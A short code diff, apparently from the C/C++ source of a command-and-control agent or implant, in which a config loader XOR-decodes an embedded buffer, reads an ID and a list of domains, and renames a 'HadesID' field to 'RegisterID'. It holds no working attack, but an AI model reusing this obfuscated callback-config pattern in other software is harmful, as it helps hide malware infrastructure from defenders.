@@ -47,7 +47,7 @@ BOOL LoadConfig() {
 		g_ByteMgr->InData[i] ^= kb[(i - 4) % 4];
 	}
 
-	hades->config->HadesID = g_ByteMgr->Read4();
+	hades->config->RegisterID = g_ByteMgr->Read4();
 	hades->config->domaincounts = g_ByteMgr->Read4();
 	for (int i = 0; i < hades->config->domaincounts; i++) {
 		UINT len = g_ByteMgr->Read4();
